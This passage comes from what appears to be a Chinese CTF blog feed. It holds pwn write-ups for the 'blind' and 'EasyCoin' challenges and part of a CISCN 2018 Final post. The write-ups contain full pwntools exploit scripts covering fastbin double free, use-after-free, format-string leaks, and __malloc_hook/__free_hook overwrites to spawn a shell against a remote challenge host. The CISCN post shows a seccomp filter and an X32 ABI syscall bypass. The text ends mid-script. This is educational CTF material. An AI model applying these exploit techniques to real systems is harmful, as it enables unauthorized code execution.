alt=""></p><p>当再次编辑时就可以修改bss段了，但是在这时发现一个特点，在这个版本的libc中将main<em>arena+88的最低位改成\x00，恰好变成\</em>_malloc_hook-0x10。因此找到一个新的想法，题目所用的编辑函数中会在输入的末位写\x00，可以将ptr[4]，指向ptr[0]，在编辑时，可以将ptr[0]写成__malloc_hook-0x10，这样再次编辑ptr[0]就可以将__malloc_hook改成题目中给的system(“/bin/sh”)函数，从而拿到shell了。</p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line">elf=ELF(<span class="string">'./blind'</span>)</span><br><span class="line">ct  = string.ascii_letters+string.digits</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">p = process(<span class="string">'./blind'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">gdb.attach(p)</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">'106.75.20.44'</span>,  <span class="number">9999</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span><span class="params">(index,content)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"Choice:"</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Index:'</span>)</span><br><span class="line">p.sendline(str(index))</span><br><span class="line">p.recvuntil(<span class="string">"Content:"</span>)</span><br><span class="line">p.send(content)</span><br><span class="line">p.recvuntil(<span class="string">"Done"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span><span class="params">(index,content)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"Choice:"</span>)</span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Index:'</span>)</span><br><span class="line">p.sendline(str(index))</span><br><span class="line">p.recvuntil(<span class="string">"Content:"</span>)</span><br><span class="line">p.send(content)</span><br><span class="line">p.recvuntil(<span class="string">"Done"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"Choice:"</span>)</span><br><span class="line">p.sendline(<span class="string">'3'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Index:'</span>)</span><br><span class="line">p.sendline(str(index))</span><br><span class="line"></span><br><span class="line">new(<span class="number">0</span>,<span class="string">'p4nda\n'</span>)</span><br><span class="line">new(<span class="number">1</span>,<span class="string">'p4nda\n'</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">new(<span class="number">2</span>,p64(<span class="number">0x602045</span><span class="number">-8</span>)+<span class="string">'\n'</span>)</span><br><span class="line">new(<span class="number">3</span>,<span class="string">'p4nda\n'</span>)</span><br><span class="line">new(<span class="number">4</span>,<span class="string">'p4nda\n'</span>)</span><br><span class="line">new(<span class="number">5</span>,<span class="string">'a'</span>*<span class="number">3</span>+p64(<span class="number">0x101</span>)*<span class="number">2</span>+p64(<span class="number">0x602060</span>)+p64(<span class="number">0x602060</span>)*<span class="number">2</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x602140</span>)*<span class="number">3</span>+<span class="string">'\n'</span>)</span><br><span class="line">change(<span class="number">4</span>,p64(<span class="number">0x21</span>)*<span class="number">12</span>+<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">change(<span class="number">2</span>,<span class="string">'\n'</span>)</span><br><span class="line">change(<span class="number">0</span>,p64(<span class="number">0x4008E3</span>)*<span class="number">3</span>+<span class="string">'\n'</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Choice:"</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Index:'</span>)</span><br><span class="line">p.sendline(str(<span class="number">3</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="EasyCoin"><a href="#EasyCoin" class="headerlink" title="EasyCoin"></a>EasyCoin</h1><p>这题是AAA战队的ZUHXS师傅发给我的，也是遇上了一个神奇问题，在给我发的i64文件中switch语句没显示default，我也是懒没看汇编，就漏掉了格式化字符串漏洞 www</p><p><img src="/img/wdb2018/2-0.png" alt=""> <img src="/img/wdb2018/2-0-1.png" alt=""></p><p>言归正传，这题最开始并没有什么想法，只是发现了功能实现上存在问题，可以给用户自身发送coin，然后delete时会存在一个不可控的free。最后根据别人的EXP调出来的，膜做出此题的师傅…</p><h2 id="功能分析"><a href="#功能分析" class="headerlink" title="功能分析"></a>功能分析</h2><p>题目的功能比较多，首先是注册和登录，注册功能中有这样一个结构体：</p><p><img src="/img/wdb2018/2-1.png" alt=""></p><p>其中username、password和结构体本身都是malloc(0x20)得到的0x30的内存块，coin_list这个指针最开始是置空的，后续操作中会用到。</p><p>在登录以后程序会维护一个结构体指针，根据这个指针指向的s_user结构体进行操作,共有display_user、send_coin、display_transaction、change_passwd、delete_user、logout操作。</p><p>在send_coin中出现了新的结构体s_coin</p><p><img src="/img/wdb2018/2-2.png" alt=""></p><p>这个结构体是一个单链表，每一笔交易发生时，会分别向发送者和接受者新建并插入这个结构体，用id来标识交易，in_out标识是收到还是支出。同样的这个s_coin结构体也是也0x30大小的块。</p><p>在change_passwd函数中，会向结构体中指向的passwd指针写入数据。</p><p>最终delete_user中，会首先释放username、passwd指针，然后变量coin_list的所有coin，并从其他用户的coin_list中移除相应的s_coin并释放。</p><p><img src="/img/wdb2018/2-3.png" alt=""></p><p><img src="/img/wdb2018/2-4.png" alt=""></p><h2 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>在整个程序中，只找到了用户可以向自己发送coin，而在delete时会触发一个释放位置地址的漏洞。</p><p>而程序在输入指令时，可以触发一个格式化字符串漏洞，通过格式化字符串漏洞可以泄露libc、堆地址。</p><p>此题的难点在于如何利用程序逻辑来对堆块进行UAF。</p><p>首先在释放的用户存在一个正常块时，释放后，由于不会对用户的coin_list进行操作，导致该链会指向fastbin链中的已释放部分。若正常逻辑也不会受到影响，但在这个coin_list上存在对自身转账的块时，就会在fastbin上寻找coin去释放，仅需利用fastbin上的脏数据即可释放一个正在用的块。</p><p>如图是释放了username、password的fastbin结构</p><p><img src="/img/wdb2018/2-5.png" alt=""></p><p>如图是释放了一对正常交易块的堆结构</p><p><img src="/img/wdb2018/2-6.png" alt=""></p><p>此时，可以看到该用户s_user指向的coin_list已经与fastbin有交集</p><p><img src="/img/wdb2018/2-7.png" alt=""></p><p>而可以看到此处是预留的脏数据，可以使其指向user2-&gt;password块</p><p><img src="/img/wdb2018/2-8.png" alt=""></p><p>而这个块中的id位置被预置为与当前查找的id相同，当运行到这里就可以使得user2-&gt;password被释放。</p><p><img src="/img/wdb2018/2-9.png" alt=""></p><p>当delete运行结束后，可以看到fastbin链上存在一个可修改的块</p><p><img src="/img/wdb2018/2-10.png" alt=""></p><p>而通过user2的change_passwd功能可以修改这个fastbin块的fd指针，如将其修改到user2本身的控制块结构体</p><p>此时被劫持的fastbin结构如下</p><p><img src="/img/wdb2018/2-11.png" alt=""></p><p>看到这样的堆结构，可以通过新建一个用户，在设置用户密码时可以覆写user2的控制块，将其password成员指向__free_hook。</p><p><img src="/img/wdb2018/2-12.png" alt=""></p><p>此时，由于password的只指向内容为\x00，因此使用\n就可登录，登录后修改密码为system地址。在delete时，</p><p>由于username是”/bin/sh”，就相当于调用了system(“/bin/sh”);</p><p>至此拿到了shell</p><h2 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line">elf=ELF(<span class="string">'./EasyCoin'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p = process(<span class="string">'./EasyCoin'</span>)</span><br><span class="line">    libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">    context.log_level = <span class="string">'debug'</span></span><br><span class="line">    gdb.attach(p,<span class="string">'b *0x401474'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">'106.75.20.44'</span>,  <span class="number">9999</span>)</span><br><span class="line">    <span class="comment">#libc = ELF('./libc.so.6')</span></span><br><span class="line">    context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">reg</span><span class="params">(username, password)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">    p.send(username)</span><br><span class="line">    p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">    p.send(password)</span><br><span class="line">    p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">    p.send(password)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">(username, password)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">    p.send(username)</span><br><span class="line">    p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">    p.send(password)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">display_user</span><span class="params">()</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_coin</span><span class="params">(username, money)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">    p.send(username)</span><br><span class="line">    p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">    p.sendline(str(money))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">display_transactpn</span><span class="params">()</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change_password</span><span class="params">(password)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">'4'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">    p.send(password)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">()</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">'5'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">logout</span><span class="params">()</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">'6'</span>)</span><br><span class="line"></span><br><span class="line">reg(<span class="string">'p4nda\n'</span>,<span class="string">'pwn\n'</span>)</span><br><span class="line">reg(<span class="string">'/bin/sh\n'</span>, <span class="string">'\x00'</span>*<span class="number">0x10</span>+<span class="string">'\x02'</span>)</span><br><span class="line">login(<span class="string">'p4nda\n'</span>,<span class="string">'pwn\n'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">p.send(<span class="string">'%9$p'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Command: '</span>)</span><br><span class="line">heap_base = int(p.recvuntil(<span class="string">'\x7f'</span>)[:<span class="number">-2</span>], <span class="number">16</span>) - <span class="number">0x10</span></span><br><span class="line">p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">p.send(<span class="string">'%3$p'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Command: '</span>)</span><br><span class="line">libc.address = int(p.recvuntil(<span class="string">'\x7f'</span>)[:<span class="number">-2</span>], <span class="number">16</span>)- <span class="number">0xf72c0</span><span class="comment">#- 7 - libc.symbols['__write_nocancel'] </span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'[*] system:'</span>,hex(libc.symbols[<span class="string">'system'</span>])</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[*] heap  :'</span>,hex(heap_base)</span><br><span class="line">send_coin(<span class="string">'/bin/sh\n'</span>,<span class="number">0x111</span>)</span><br><span class="line">delete()</span><br><span class="line">reg(<span class="string">'p4nda\n'</span>,<span class="string">'pwn\n'</span>)</span><br><span class="line">login(<span class="string">'p4nda\n'</span>,<span class="string">'pwn\n'</span>)</span><br><span class="line">send_coin(<span class="string">'/bin/sh\n'</span>,heap_base+<span class="number">0x100</span>)</span><br><span class="line">send_coin(<span class="string">'p4nda\n'</span>,<span class="number">0x3333</span>)</span><br><span class="line"></span><br><span class="line">delete()</span><br><span class="line">login(<span class="string">'/bin/sh'</span>,p64(heap_base+<span class="number">0x30</span>))</span><br><span class="line">send_coin(<span class="string">'/bin/sh'</span>,<span class="number">0x4444</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p,'b *0x400b0f')</span></span><br><span class="line">change_password(p64(heap_base+<span class="number">0xa0</span><span class="number">-0x10</span>))</span><br><span class="line">logout()</span><br><span class="line">reg(<span class="string">"i_am_padding\n"</span>,p64(heap_base+<span class="number">0xd0</span>)+p64(libc.symbols[<span class="string">'__free_hook'</span>])+p64(<span class="number">0xdeadbeef</span>)+p64(<span class="number">0</span>)[:<span class="number">-1</span>])</span><br><span class="line">login(<span class="string">'/bin/sh'</span>,<span class="string">'\n'</span>)</span><br><span class="line">change_password(p64(libc.symbols[<span class="string">'system'</span>])+<span class="string">'\n'</span>)</span><br><span class="line">delete()</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      没有参加网鼎杯的比赛，在家放假咸鱼了两周，回来复现了几道题，本篇记录blind、EasyCoin两题。
    
    </summary>
    
    
      <category term="CTF" scheme="http://p4nda.top/tags/CTF/"/>
    
      <category term="PWN" scheme="http://p4nda.top/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>CISCN 2018 Final赛记</title>
    <link href="http://p4nda.top/2018/07/27/CISCN-Final/"/>
    <id>http://p4nda.top/2018/07/27/CISCN-Final/</id>
    <published>2018-07-27T05:26:01.000Z</published>
    <updated>2018-07-28T03:52:43.409Z</updated>
    
    <content type="html"><![CDATA[<p>总而言之，我就觉得这次主办方的想法很有问题。尤其是最后在所有选手在场等了一个下午的情况下，没有给参赛队颁奖的环节，反而给什么优秀支撑单位、技术委员会颁了奖。这也是我第一次见过这样的设计，比赛在北京打，颁奖隔两天去武汉颁，谁有精力陪你折腾，而且没有任何通知，真的是mdzz。</p><p><strong><em>//以上戾气有点大，这次比赛还是学了很多东西的，内容有点短，就当我水了一篇吧，实在是有的东西不想说了。</em></strong></p><p>我们队分了一道CNSS战队plusls师傅出的一道PWN题，其中有一个seccomp沙箱，里面的逻辑是这样的。</p><p><img src="/img/ciscn-final/1-1.png" alt=""></p><p>看起来，没有什么问题，主要限制了open系列的系统调用，限制了这个以后，shell也没法起了。</p><p>比赛时，没有想到如何过这个限制。第一天打完了以后和plusls师傅交流了一下，感觉是个挺有意思的东西。</p><p>首先，线上赛那个题目逻辑挺复杂的，利用<a href="https://github.com/david942j/seccomp-tools" target="_blank" rel="noopener">seccomp-tools</a>简单复现了一下逻辑。</p><p>sandbox.asm</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">A = arch</span><br><span class="line">A == ARCH_X86_64 ? next : dead</span><br><span class="line">A = sys_number</span><br><span class="line">A == open ? dead : next</span><br><span class="line">A == mmap ? dead : next</span><br><span class="line">A == ptrace ? dead : next</span><br><span class="line">A == openat ? dead : next</span><br><span class="line">A == open_by_handle_at ? dead : next</span><br><span class="line">return ALLOW</span><br><span class="line">dead:</span><br><span class="line">return KILL</span><br></pre></td></tr></table></figure><p>将沙箱逻辑使用seccomp-tools编译，将其转换为数组：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">┌─[p4nda@p4nda-virtual-machine] - [~/Desktop/pwn/<span class="built_in">test</span>/x32 abi] - [五 7月 27, 16:00]</span><br><span class="line">└─[$] &lt;&gt; seccomp-tools asm sandbox.asm -a amd64  -f carray</span><br><span class="line">unsigned char bpf[] = &#123;32,0,0,0,4,0,0,0,21,0,0,7,62,0,0,192,32,0,0,0,0,0,0,0,21,0,5,0,2,0,0,0,21,0,4,0,9,0,0,0,21,0,3,0,101,0,0,0,21,0,2,0,1,1,0,0,21,0,1,0,48,1,0,0,6,0,0,0,0,0,255,127,6,0,0,0,0,0,0,0&#125;;</span><br><span class="line"></span><br><span class="line">┌─[p4nda@p4nda-virtual-machine] - [~/Desktop/pwn/<span class="built_in">test</span>/x32 abi] - [五 7月 27, 16:00]</span><br><span class="line">└─[$] &lt;&gt; seccomp-tools asm sandbox.asm -a amd64 -f raw | seccomp-tools disasm -</span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A = arch</span><br><span class="line"> 0001: 0x15 0x00 0x07 0xc000003e  <span class="keyword">if</span> (A != ARCH_X86_64) goto 0009</span><br><span class="line"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0003: 0x15 0x05 0x00 0x00000002  <span class="keyword">if</span> (A == open) goto 0009</span><br><span class="line"> 0004: 0x15 0x04 0x00 0x00000009  <span class="keyword">if</span> (A == mmap) goto 0009</span><br><span class="line"> 0005: 0x15 0x03 0x00 0x00000065  <span class="keyword">if</span> (A == ptrace) goto 0009</span><br><span class="line"> 0006: 0x15 0x02 0x00 0x00000101  <span class="keyword">if</span> (A == openat) goto 0009</span><br><span class="line"> 0007: 0x15 0x01 0x00 0x00000130  <span class="keyword">if</span> (A == open_by_handle_at) goto 0009</span><br><span class="line"> 0008: 0x06 0x00 0x00 0x7fff0000  <span class="built_in">return</span> ALLOW</span><br><span class="line"> 0009: 0x06 0x00 0x00 0x00000000  <span class="built_in">return</span> KILL</span><br></pre></td></tr></table></figure><p>然后就可以编写程序逻辑了，这里我使用一个简化的demo，直接开沙箱执行shellcode：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;seccomp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/filter.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/seccomp.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sandbox</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> bpf[] = &#123;<span class="number">32</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">21</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">7</span>,<span class="number">62</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">192</span>,<span class="number">32</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">21</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">21</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">0</span>,<span class="number">9</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">21</span>,<span class="number">0</span>,<span class="number">3</span>,<span class="number">0</span>,<span class="number">101</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">21</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">21</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">48</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">6</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">255</span>,<span class="number">127</span>,<span class="number">6</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>&#125;;</span><br><span class="line">prctl(PR_SET_NO_NEW_PRIVS,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sock_fprog</span> <span class="title">sfp</span> = &#123;</span><span class="number">10</span>,bpf&#125;; <span class="comment">//10代表沙箱规则条数</span></span><br><span class="line">prctl(PR_SET_SECCOMP,SECCOMP_MODE_FILTER,&amp;sfp);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">char</span> * shellcode;</span><br><span class="line"><span class="keyword">void</span> (*vul)();</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"sandbox init"</span>);</span><br><span class="line"></span><br><span class="line">write(<span class="number">1</span>,<span class="string">"shellcode:"</span>,<span class="number">0x10</span>);</span><br><span class="line">shellcode = mmap(<span class="number">0</span>,<span class="number">0x1000</span>,PROT_EXEC | PROT_READ |PROT_WRITE,MAP_SHARED|MAP_ANONYMOUS,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">read(<span class="number">0</span>,shellcode,<span class="number">0x1000</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"call %p"</span>,shellcode);</span><br><span class="line">vul = shellcode;</span><br><span class="line">sandbox();</span><br><span class="line">vul();</span><br><span class="line"><span class="comment">//shellcode();</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此时，可以发现程序无法打开文件。</p><p>利用赛后交流时提到的X32 ABI，我后来搜索了一下，比较早出现这个东西的是BCTF的一道PWN题，和这个类似。看了一下发现这个东西方法是一个系统调用的两个调用号，官方的说法是0x40000000置了一个标准位。</p><p>然后，利用这一点，在调用open时，使用0x40000002，这个调用号就可以绕过沙箱，读出flag了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch = <span class="string">'amd64'</span>, os = <span class="string">'linux'</span>, 